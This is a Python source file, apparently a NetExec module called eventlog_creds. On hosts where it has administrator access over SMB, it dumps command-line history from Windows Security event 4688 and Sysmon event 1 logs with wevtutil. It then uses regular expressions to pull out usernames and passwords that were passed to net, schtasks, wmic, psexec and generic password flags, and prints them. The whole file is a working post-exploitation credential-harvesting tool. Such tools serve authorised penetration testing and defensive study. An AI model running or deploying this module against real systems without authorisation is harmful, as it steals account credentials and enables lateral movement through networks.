import re

class NXCModule:
    """
    Module by @lodos2005
    This module extracts credentials from Windows logs. It uses Security Event ID: 4688 and SYSMON logs.
    """
    name = "eventlog_creds"
    description = "Extracting Credentials From Windows Logs (Event ID: 4688 and SYSMON)"
    supported_protocols = ["smb"]  # Example: ['smb', 'mssql']
    opsec_safe = True  # Does the module touch disk?
    multiple_hosts = True  # Does it make sense to run this module on multiple hosts at a time?

    def __init__(self):
        self.context = None
        self.module_options = None

    def options(self, context, module_options):
        """ """

    def on_admin_login(self, context, connection):
        # https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4688
        commands = [
            'wevtutil qe Security /f:text /rd:true /q:"*[System[(EventID=4688)]]" |findstr "Command Line"',
            'wevtutil qe Microsoft-Windows-Sysmon/Operational /f:text  /rd:true /q:"*[System[(EventID=1)]]" |findstr "CommandLine"'
        ]
        content = ""
        for command in commands:
            context.log.debug("Execute Command: " + command)
            content += connection.execute(command, True)

        # remove unnecessary words
        content = content.replace("\r\n", "\n")
        content = content.replace("/add", "") 
        content = content.replace("/active:yes", "") 

        regexps = [
        # "C:\Windows\system32\net.exe" user /add lodos2005 123456 /domain 
        "net.+user\s+(?P<username>[^\s]+)\s+(?P<password>[^\s]+)",
        # "C:\Windows\system32\net.exe" use \\server\share /user:contoso\lodos2005 password
        "net.+use.+/user:(?P<username>[^\s]+)\s+(?P<password>[^\s]+)",
        # schtasks.exe /CREATE /S 192.168.20.05 /RU SYSTEM /U lodos2005@contoso /P "123456" /SC ONCE /ST 20:05 /TN Test /TR hostname /F
        "schtasks.+/U\s+(?P<username>[^\s]+).+/P\s+(?P<password>[^\s]+)",
        # wmic.exe /node:192.168.20.05 /user:lodos2005@contoso /password:123456 computersystem get
        "wmic.+/user:\s*(?P<username>[^\s]+).+/password:\s*(?P<password>[^\s]+)",
        # psexec \\192.168.20.05 -u lodos2005@contoso -p 123456 hostname
        "psexec.+-u\s+(?P<username>[^\s]+).+-p\s+(?P<password>[^\s]+)",
        # generic username on command line
        "(?:(?:(?:-u)|(?:-user)|(?:-username)|(?:--user)|(?:--username)|(?:/u)|(?:/USER)|(?:/USERNAME))(?:\s+|\:)(?P<username>[^\s]+))",
        # generic password on command line
        "(?:(?:(?:-p)|(?:-password)|(?:-passwd)|(?:--password)|(?:--passwd)|(?:/P)|(?:/PASSWD)|(?:/PASS)|(?:/CODE)|(?:/PASSWORD))(?:\s+|\:)(?P<password>[^\s]+))",
        ]
        # Extracting credentials
        for line in content.split("\n"):
            for reg in regexps:
                # verbose context.log.debug("Line: " + line)
                # verbose context.log.debug("Reg: " + reg)
                m = re.search(reg, line, re.IGNORECASE)
                if m:
                    # eleminate false positives
                    # C:\Windows\system32\svchost.exe -k DcomLaunch -p -s PlugPlay
                    if not m.groupdict().get("username") and m.groupdict().get("password") and len(m.group("password")) < 6: 
                        # if password is found but username is not found, and password is shorter than 6 characters, ignore it
                        continue
                    if not m.groupdict().get("password") and m.groupdict().get("username"): 
                        # if username is found but password is not found. we need? ignore it 
                        continue
                    # C:\Windows\system32\RunDll32.exe C:\Windows\system32\migration\WininetPlugin.dll,MigrateCacheForUser /m /0
                    if m.groupdict().get("username") and m.groupdict().get("password") and len(m.group("password")) < 6 and len(m.group("username")) < 6:
                        # if username and password is shorter than 6 characters, ignore it
                        continue

                    context.log.highlight("Credentials found! " + line.strip())
                    if m.groupdict().get("username"):
                        context.log.highlight("Username: " + m.group("username"))
                    if m.groupdict().get("password"):
                        context.log.highlight("Password: " + m.group("password"))
                    break
